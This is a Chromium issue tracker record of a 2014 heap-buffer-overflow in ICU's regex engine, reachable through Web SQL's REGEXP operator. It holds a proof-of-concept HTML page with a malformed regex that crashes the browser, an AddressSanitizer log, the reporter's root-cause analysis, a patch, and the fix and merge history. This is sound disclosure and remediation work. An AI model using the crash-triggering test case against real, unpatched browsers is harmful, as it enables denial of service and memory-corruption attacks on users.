# Heap-buffer-overflow in icu_52::RegexMatcher::MatchChunkAt

| Field | Value |
|-------|-------|
| **Issue ID** | [40080629](https://issues.chromium.org/issues/40080629) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | ya...@gmail.com |
| **Assignee** | js...@chromium.org |
| **Created** | 2014-10-13 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

The ICU regular expression compiler doesn't properly handle certain malformed patterns, causing incorrect opcodes to be generated. When these opcodes are later used by the match engine, invalid reads/writes to the heap memory will occur. This bug is exposed through the browser's Web SQL Database support, and can be reached by using the REGEXP operator in a Web SQL statement.

**VERSION**  

Verified with the following combinations:  

Chrome 38.0.2125.101 (64-bit) / Ubuntu 14.04 LTS  

Chromium 40.0.2182.0 (64-bit, ASan-instrumented debug and release builds) / Ubuntu 14.04 LTS

**REPRODUCTION CASE**  

For reproduction, simply do the following:

1. Load in the browser:

<html>
<head>
<script>
var db = openDatabase('test\_db', '1.0', 'Test database', 1024);
db.transaction(function(tx) {
for (i = 0; i < 1000; i++) {
tx.executeSql('SELECT "AAAAABBBBBCCCCCDDDDEEEEE" REGEXP "(.|b)(|b){0}\\Q\\E\\$(?#xxx){3}(?>\\D\\*)"');
}
location.reload();
});
</script>
</head>
</html>
2. Meet the sad tab.

With ASan-instrumented release build of Chromium, the following log will be printed upon crash:

# ./asan-linux-release-298668/chrome-wrapper --no-sandbox [8391:8391:1012/232409:ERROR:browser\_main\_loop.cc(163)] Running without the SUID sandbox! See <https://code.google.com/p/chromium/wiki/LinuxSUIDSandboxDevelopment> for more information on developing with the sandbox on. [8480:8480:1012/232419:ERROR:renderer\_main.cc(206)] Running without renderer sandbox [8484:8484:1012/232419:ERROR:renderer\_main.cc(206)] Running without renderer sandbox [8510:8510:1012/232430:ERROR:renderer\_main.cc(206)] Running without renderer sandbox

==8510==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000080ac0 at pc 0x7fca064b0dfb bp 0x7fc9c7bbc0d0 sp 0x7fc9c7bbc0c8  

WRITE of size 8 at 0x611000080ac0 thread T10 (WebCore: Databa)  

#0 0x7fca064b0dfa (/home/yang/Downloads/asan-linux-release-298668/chrome+0x380ddfa)  

#1 0x7fca064b643c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x381343c)  

#2 0x7fca10345524 (/home/yang/Downloads/asan-linux-release-298668/chrome+0xd6a2524)  

#3 0x7fca07eabd01 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x5208d01)  

#4 0x7fca0803e82d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x539b82d)  

#5 0x7fca07e7039e (/home/yang/Downloads/asan-linux-release-298668/chrome+0x51cd39e)  

#6 0x7fca0c133333 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9490333)  

#7 0x7fca0c51583c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x987283c)  

#8 0x7fca0c123194 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9480194)  

#9 0x7fca0c1214c2 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x947e4c2)  

#10 0x7fca0c122841 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x947f841)  

#11 0x7fca0c50d80d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x986a80d)  

#12 0x7fca05d82aea (/home/yang/Downloads/asan-linux-release-298668/chrome+0x30dfaea)  

#13 0x7fca05cba89c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301789c)  

#14 0x7fca05cbba97 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3018a97)  

#15 0x7fca05cc2f11 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301ff11)  

#16 0x7fca05ceec73 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x304bc73)  

#17 0x7fca05cb8f32 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3015f32)  

#18 0x7fca05d430e2 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x30a00e2)  

#19 0x7fca05d36775 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3093775)  

#20 0x7fc9fd9fc181 (/lib/x86\_64-linux-gnu/libpthread.so.0+0x8181)  

#21 0x7fc9fac88fbc (/lib/x86\_64-linux-gnu/libc.so.6+0xfafbc)

0x611000080ac0 is located 64 bytes to the left of 256-byte region [0x611000080b00,0x611000080c00)  

allocated by thread T10 (WebCore: Databa) here:  

#0 0x7fca04d4d35e (/home/yang/Downloads/asan-linux-release-298668/chrome+0x20aa35e)  

#1 0x7fca067ea93a (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3b4793a)  

#2 0x7fca064a2f0d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x37fff0d)  

#3 0x7fca064b643c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x381343c)  

#4 0x7fca10345524 (/home/yang/Downloads/asan-linux-release-298668/chrome+0xd6a2524)  

#5 0x7fca07eabd01 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x5208d01)  

#6 0x7fca0803e82d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x539b82d)  

#7 0x7fca07e7039e (/home/yang/Downloads/asan-linux-release-298668/chrome+0x51cd39e)  

#8 0x7fca0c133333 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9490333)  

#9 0x7fca0c51583c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x987283c)  

#10 0x7fca0c123194 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9480194)  

#11 0x7fca0c1214c2 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x947e4c2)  

#12 0x7fca0c122841 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x947f841)  

#13 0x7fca0c50d80d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x986a80d)  

#14 0x7fca05d82aea (/home/yang/Downloads/asan-linux-release-298668/chrome+0x30dfaea)  

#15 0x7fca05cba89c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301789c)  

#16 0x7fca05cbba97 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3018a97)  

#17 0x7fca05cc2f11 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301ff11)  

#18 0x7fca05ceec73 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x304bc73)  

#19 0x7fca05cb8f32 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3015f32)  

#20 0x7fca05d430e2 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x30a00e2)  

#21 0x7fca05d36775 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3093775)  

#22 0x7fc9fd9fc181 (/lib/x86\_64-linux-gnu/libpthread.so.0+0x8181)

Thread T10 (WebCore: Databa) created by T0 (chrome) here:  

#0 0x7fca04d34b9f (/home/yang/Downloads/asan-linux-release-298668/chrome+0x2091b9f)  

#1 0x7fca05d35ecd (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3092ecd)  

#2 0x7fca05d427d4 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x309f7d4)  

#3 0x7fca05d4256f (/home/yang/Downloads/asan-linux-release-298668/chrome+0x309f56f)  

#4 0x7fca0f7ae566 (/home/yang/Downloads/asan-linux-release-298668/chrome+0xcb0b566)  

#5 0x7fca0f73c8ab (/home/yang/Downloads/asan-linux-release-298668/chrome+0xca998ab)  

#6 0x7fca10f757ae (/home/yang/Downloads/asan-linux-release-298668/chrome+0xe2d27ae)  

#7 0x7fca0c51041b (/home/yang/Downloads/asan-linux-release-298668/chrome+0x986d41b)  

#8 0x7fca0c50cc4a (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9869c4a)  

#9 0x7fca0c4f6ead (/home/yang/Downloads/asan-linux-release-298668/chrome+0x9853ead)  

#10 0x7fca0c100125 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x945d125)  

#11 0x7fca0c100750 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x945d750)  

#12 0x7fca0c0fefff (/home/yang/Downloads/asan-linux-release-298668/chrome+0x945bfff)  

#13 0x7fca0b949223 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x8ca6223)  

#14 0x7fca090aaa90 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6407a90)  

#15 0x7fca08613534 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x5970534)  

#16 0x7fc9ca3063ad (<unknown module>)  

#17 0x7fc9ca36b87c (<unknown module>)  

#18 0x7fc9ca35cfbf (<unknown module>)  

#19 0x7fc9ca32f810 (<unknown module>)  

#20 0x7fca0874f3eb (/home/yang/Downloads/asan-linux-release-298668/chrome+0x5aac3eb)  

#21 0x7fca085604f4 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x58bd4f4)  

#22 0x7fca0b3f1408 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x874e408)  

#23 0x7fca0b348160 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x86a5160)  

#24 0x7fca0b34e44d (/home/yang/Downloads/asan-linux-release-298668/chrome+0x86ab44d)  

#25 0x7fca0b34ed6e (/home/yang/Downloads/asan-linux-release-298668/chrome+0x86abd6e)  

#26 0x7fca097c3fb9 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6b20fb9)  

#27 0x7fca097be68c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6b1b68c)  

#28 0x7fca09aaae8f (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6e07e8f)  

#29 0x7fca09aaa7aa (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6e077aa)  

#30 0x7fca09a7a599 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6dd7599)  

#31 0x7fca09a7dc72 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6ddac72)  

#32 0x7fca09a795fc (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6dd65fc)  

#33 0x7fca09a7b76e (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6dd876e)  

#34 0x7fca09c5f452 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x6fbc452)  

#35 0x7fca08400bdf (/home/yang/Downloads/asan-linux-release-298668/chrome+0x575dbdf)  

#36 0x7fca083f6917 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x5753917)  

#37 0x7fca083f59ae (/home/yang/Downloads/asan-linux-release-298668/chrome+0x57529ae)  

#38 0x7fca05d82aea (/home/yang/Downloads/asan-linux-release-298668/chrome+0x30dfaea)  

#39 0x7fca05cba89c (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301789c)  

#40 0x7fca05cbba97 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3018a97)  

#41 0x7fca05cc2f11 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x301ff11)  

#42 0x7fca05ceec73 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x304bc73)  

#43 0x7fca05cb8f32 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x3015f32)  

#44 0x7fca0f92a0f9 (/home/yang/Downloads/asan-linux-release-298668/chrome+0xcc870f9)  

#45 0x7fca05c281c5 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x2f851c5)  

#46 0x7fca05c2a549 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x2f87549)  

#47 0x7fca05c277e8 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x2f847e8)  

#48 0x7fca04d69897 (/home/yang/Downloads/asan-linux-release-298668/chrome+0x20c6897)  

#49 0x7fc9fabafec4 (/lib/x86\_64-linux-gnu/libc.so.6+0x21ec4)

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ??  

Shadow bytes around the buggy address:  

0x0c2280008100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2280008110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2280008120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2280008130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c2280008140: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c2280008150: fa fa fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa  

0x0c2280008160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c2280008170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c2280008180: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c2280008190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c22800081a0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

ASan internal: fe  

==8510==ABORTING  

[8391:8457:1012/232439:ERROR:channel.cc(254)] RawChannel read error (connection broken)

For debug build of Chromium, the PoC will trigger an assertion failure during compilation of the pattern, as shown in the following output (full error log is attached below):

chrome --type=renderer --no-sandbox --enable-deferred-image-decoding --lang=en-US --force-fieldtrials=Prerender/MatchComplete/UMA-New-Install-Uniformity-Trial/Experiment/UMA-Session-Randomized-Uniformity-Trial-5-Percent/group\_11/UMA-Uniformity-Trial-1-Percent/group\_24/UMA-Uniformity-Trial-10-Percent/group\_04/UMA-Uniformity-Trial-100-Percent/group\_01/UMA-Uniformity-Trial-20-Percent/group\_04/UMA-Uniformity-Trial-5-Percent/group\_03/UMA-Uniformity-Trial-50-Percent/group\_01/ --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --enable-delegated-renderer --enable-impl-side-painting --num-raster-threads=1 --disable-accelerated-video-decode --channel=8007.3.821525718: ../../third\_party/icu/source/i18n/regexcmp.cpp:1978: int32\_t icu\_52::RegexCompile::blockTopLoc(UBool): Assertion `((uint32\_t)(((uint32\_t)fRXPat->fCompiledPat->elementAti(theLoc))) >> 24) == URX\_NOP' failed.

## Attachments

- [dbg_log.txt](attachments/dbg_log.txt) (text/plain, 5.4 KB)

## Timeline

### cl...@chromium.org (2014-10-13)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5717155692675072

### mb...@chromium.org (2014-10-13)

jshin: Could you please take a look at this when you get a chance or reassign it to someone else?

### in...@chromium.org (2014-10-13)

Very nice bug!

### cl...@chromium.org (2014-10-13)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5717155692675072

Uploader: mbarbella@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow WRITE 8
Crash Address: 0x6120000b26c0
Crash State:
  icu_52::RegexMatcher::MatchChunkAt
  icu_52::RegexMatcher::matches
  uregex_matches_52
  

Minimized Testcase (0.29 Kb): https://cluster-fuzz.appspot.com/download/AMIfv9785dp0v_ZLQgEqF26X6c_1G-R984HXJ3X9lzochXtO2KBGUhxLAvjPDR_SP8LZUZzjmNYhufvXNkHX9fw8rzTBlmoS_NiaL0stzcAuULd92gm2ENhjuABArcIvDuK74NdjTbosmYzjGMEy_IYBBHrIKLdlPw



### cl...@chromium.org (2014-10-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-10-21)

jshin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ya...@gmail.com (2014-10-24)

I've looked further into this issue and found it may have something to do with an incomplete optimization in the ICU regex compiler. When the compiler encounters a zero value quantifier following a group, it will perform an optimization and simply discard opcodes emitted for the preceding group, as shown in the following code:

(In icu_52::RegexCompile::compileInlineInterval(), taken from regexcmp.cpp)

2329    int32_t   topOfBlock = blockTopLoc(FALSE);
2330    if (fIntervalUpper == 0) {
2331        // Pathological case.  Attempt no matches, as if the block doesn't exist.
2332        fRXPat->fCompiledPat->setSize(topOfBlock);
2333        return TRUE;
2334    }

Here elimination of the redundant opcodes is done through the call to setSize(). 

Meanwhile, the compiler also maintains two variables, fMatchOpenParen and fMatchCloseParen, which tracks "the position in the compiled pattern of the slot reserved for a state save at the start of the most recently processed parenthesized block". The problem is, these two variables are not properly updated when the elimination takes place, leading to incorrect opcodes to be generated in the release build, or assertion failure in the debug build.

Consider the pattern (|b){0}a{3}(a*), the first group (|b) will be compiled to:

SLOT    OPCODE
----------------
   0    STATE_SAVE 2
   1    JMP 3
   2    FAIL
   3    NOP
   4    NOP
   5    NOP                 <- Start of opcodes for (|b)
   6    START_CAPTURE 0
   7    STATE_SAVE 9
   8    JMP 11
   9    NOP
  10    ONECHAR
  11    END_CAPTURE 0

When the compiler proceeds to the quantifier {0}, it will do the optimization and call fRXPat->fCompiledPat->setSize(5), effectively discarding opcodes for (|b). However, the variables fMatchOpenParen and fMatchCloseParen were set to 5 and 12 during compilation of (|b), and these values stay the same after the optimization. Later when the compiler processes the * symbol, an assertion failure in icu_52::RegexCompile::blockTopLoc(UBool reserveLoc) will be triggered, causing the program to abort.

I suspect this is the reason behind the memory corruption, but I'm not quite sure if fixing this will solve the problem all.

### cl...@chromium.org (2014-10-28)

jshin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ia...@chromium.org (2014-11-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-11-03)

@yangdingning: hey, great to see you back! Nice bug.
- Is this more grammar-based fuzzing like some of your previous work?
- Great choice of research target.
- Do you think you'll find more in this component?

### cl...@chromium.org (2014-11-04)

jshin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ya...@gmail.com (2014-11-05)

Greetings @scarybeasts, very glad to be back here and see you guys again!

> @yangdingning: hey, great to see you back! Nice bug.
> - Is this more grammar-based fuzzing like some of your previous work?
Basically the same approach, only with some minor tweaks.

> - Great choice of research target.
> - Do you think you'll find more in this component?
Not quite sure. I've patched the ICU source and let the fuzzer run for a few more days. Nothing has been found so far. In a reference fuzzing session, Radamsa was able to trigger a crash in the engine, but I'm yet to see if this is exploitable. BTW, I've just opened a new bug (#430353) for this component, but it was found by manually auditing (well, greping through actually) the code, not by means of fuzzing.


### cl...@chromium.org (2014-11-08)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-11-10)

Terribly sorry for the delay. Adding the author of ICU regex engine.

@yangdingning, you talked about a patch. If you have a (trial) patch, can you share it with us? 





### js...@chromium.org (2014-11-10)

Just filed an upstream bug at http://bugs.icu-project.org/trac/ticket/11369 (not visible to non-project members). Andy (ICU regex engine owner) is working on a fix. 


### ya...@gmail.com (2014-11-11)

@jshin: My patch simply resets the two variables in the case of a zero quantifier. When the compiler reaches another close parenthesis in the pattern later on, these variables will be updated to proper values again by the call to RegexCompile::handleCloseParen().

--- regexcmp.cpp.bak	2013-10-05 04:48:42.000000000 +0800
+++ regexcmp.cpp	2014-11-11 21:36:07.646642100 +0800
@@ -2330,6 +2330,8 @@
     if (fIntervalUpper == 0) {
         // Pathological case.  Attempt no matches, as if the block doesn't exist.
         fRXPat->fCompiledPat->setSize(topOfBlock);
+        fMatchOpenParen = -1;
+        fMatchCloseParen = -1;
         return TRUE;
     }


### js...@chromium.org (2014-11-12)

Thanks. The upstream change (being reviewed) is similar, but it compares fMatch{Open,Close}Paren with topOfBlock and resets them to -1 only when fMathc*Paren >= topOfBlock. 

BTW, how long does it take to get a sad tab in your test case (https://crbug.com/chromium/422824#c0)? 15+ minutes have passed, but still no crash (it keeps 'running'). 


### ya...@gmail.com (2014-11-13)

> Thanks. The upstream change (being reviewed) is similar, but it compares fMatch{Open,Close}Paren with topOfBlock and resets them to -1 only when fMathc*Paren >= topOfBlock.
Hmm, the upstream fix is more sensible. Checking against topOfBlock takes care of the case (among others?) where the atom before zero quantifier is not a parenthesized block. Thanks for letting me know.

> BTW, how long does it take to get a sad tab in your test case (https://crbug.com/chromium/422824#c0)? 15+ minutes have passed, but still no crash (it keeps 'running').
I've tested Chrome 38.0.2125.122 (32 & 64 bit) on a Windows 8 PC at hand. Both versions crashed within 20 seconds upon loading this test case. It seems that the 32-bit version takes more time to show the sad tab, but 15+ minutes is way too long. Can you try with an ASan-enabled build of Chromium instead? That should reveal the bug more quickly.


### js...@chromium.org (2014-11-13)

Thank you, yangdingning, for the reply. Even after almost an hour, the tab kept 'running' (it's on Linux with 64bit build - Chrome 40.x, I believe).  I'll try an Asan-enabled build. 

### bu...@chromium.org (2014-11-14)

------------------------------------------------------------------
r292943 | jshin@chromium.org | 2014-11-14T19:41:00.543510Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/i18n/regexcmp.cpp?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/test/testdata/regextst.txt?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/README.chromium?r1=292943&r2=292942&pathrev=292943
   M http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/source/i18n/regexcmp.h?r1=292943&r2=292942&pathrev=292943

Cherry-pick two upstream patches to the ICU regex engine

The patches for the following upstream two bugs are cherry-picked:

  http://bugs.icu-project.org/trac/ticket/11369
  http://bugs.icu-project.org/trac/ticket/11370


BUG=422824,430353
TEST=See the bugs.
TBR=mbarbella

Review URL: https://codereview.chromium.org/732743002
-----------------------------------------------------------------

### bu...@chromium.org (2014-11-14)

------------------------------------------------------------------
r292944 | jshin@chromium.org | 2014-11-14T19:50:50.025756Z

Changed paths:
   A http://src.chromium.org/viewvc/chrome/trunk/deps/third_party/icu52/patches/regex.patch?r1=292944&r2=292943&pathrev=292944

Add regex.patch file forgotten in the previous CL

BUG=422824,430353
TEST=NONE
TBR=mbarbella

Review URL: https://codereview.chromium.org/719943004
-----------------------------------------------------------------

### bu...@chromium.org (2014-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2e9716bacd10f8e8444190894fec0e4d55804a7e

commit 2e9716bacd10f8e8444190894fec0e4d55804a7e
Author: Jungshik Shin (jungshik at google) <jshin@chromium.org>
Date: Fri Nov 14 23:50:22 2014

Roll src/third_party/icu d8b2a9d:6242e2f (svn 292476:292944)

Summary of changes available at:
https://chromium.googlesource.com/chromium/deps/icu52/+log/d8b2a9d..6242e2f

BUG=422824,430353
TEST=See the bugs (https://crbug.com/chromium/422824#c0, https://crbug.com/chromium/430353#c5)
R=mbarbella@chromium.org
TBR=mbarbella

Review URL: https://codereview.chromium.org/726973003

Cr-Commit-Position: refs/heads/master@{#304299}

[modify] https://chromium.googlesource.com/chromium/src.git/+/2e9716bacd10f8e8444190894fec0e4d55804a7e/DEPS


### js...@chromium.org (2014-11-15)

It's fixed in trunk. 

To apply the CL to M39 branch, we need to make a M39 branch for third_party/icu because there've been multiple  non-trivial changes (that required changes in Blink and Chromium)  between the version of icu in M39 (d2abf6c1e) and the trunk.   

@chase, deps/third_party/icu52 (in svn) needs to have a branch for M39 and that branch has to be 'replicated' in git. What would be the best way to do that? 

### js...@chromium.org (2014-11-15)

In the meantime, I'll roll icu in M40 DEPS file (there's no intervening change so that rolling in this change for M40 is easy). 

@cevans, would the security team approve the merge or should I ask the TPM in charge (as with other merges)?  



### mb...@chromium.org (2014-11-15)

Ask the TPM as you would with other merges.

### js...@chromium.org (2014-11-17)

Asking for merge to M40 branch. 

Merging to M39 will be made after figuring out how to. 

### la...@google.com (2014-11-17)

Approved for M40 (branch: 2214)

### la...@google.com (2014-11-17)

[Automated comment] Less than 2 weeks to go before stable on M39, manual review required.

### bu...@chromium.org (2014-11-17)

The following revision refers to this bug:
  http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=64556

------------------------------------------------------------------
r64556 | jungshik@google.com | 2014-11-17T20:34:27.114728Z

-----------------------------------------------------------------

### [Deleted User] (2014-11-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-25)

jshin@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### js...@chromium.org (2014-11-25)

It's fixed in M40 and M41. I'm working out a way to merge to M39. 


### cl...@chromium.org (2014-11-26)

[Empty comment from Monorail migration]

### am...@chromium.org (2014-12-02)

any progress on determining if we can make this happen for m39?  i'll need to know in the next few days.

timwillis@, can we defer to m40 if we are unsure on how to make this happen soon?

### js...@chromium.org (2014-12-02)

I've just pinged the infra team once more as to how best to handle the merge. 
There are two more ICU security patches slated to be in M39. 

### js...@chromium.org (2014-12-03)

The infra-side is ready. Requesting for merge to M39 once more (replacing Merge-Review with Merge-request) to bubble up the request. 


### ma...@google.com (2014-12-03)

[Automated comment] Request affecting a post-stable build (M39), manual review required.

### bu...@chromium.org (2014-12-09)

The following revision refers to this bug:
  http://goto.ext.google.com/viewvc/chrome-internal?view=rev&revision=65577

------------------------------------------------------------------
r65577 | jungshik@google.com | 2014-12-09T00:33:36.588803Z

-----------------------------------------------------------------

### [Deleted User] (2014-12-12)

Per discussion with Alex, merge was approved and has been done.  Marking as Merge-Merged.

### in...@chromium.org (2014-12-15)

We will probably not have another m39 patch. Can just let it roll into m40.

### js...@chromium.org (2014-12-19)

It's merged to M39 branch on Dec 8 (see comments 38 and 39). but it looks like it was too late for Dec 9 stable update. 

https://chromium.googlesource.com/chromium/src/+log/39.0.2171.71..39.0.2171.95?pretty=fuller&n=10000 does not have that merge. 

Anyway, merging to M39 triggered me to switch to git for third_party/icu (with a big help from mmoss), which streamlined the process for ICU updates in the future. So, the effort was not a waste. And in case we happen to have one more M39 release, we have a patch in place.

BTW, M40 merge was done on Nov. 17. We're all good there. 


### ti...@google.com (2015-01-22)

Congratulations (again!) - $4000 for this report.

### cl...@chromium.org (2015-03-04)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-03-06)

[Empty comment from Monorail migration]

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/422824?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080629)*
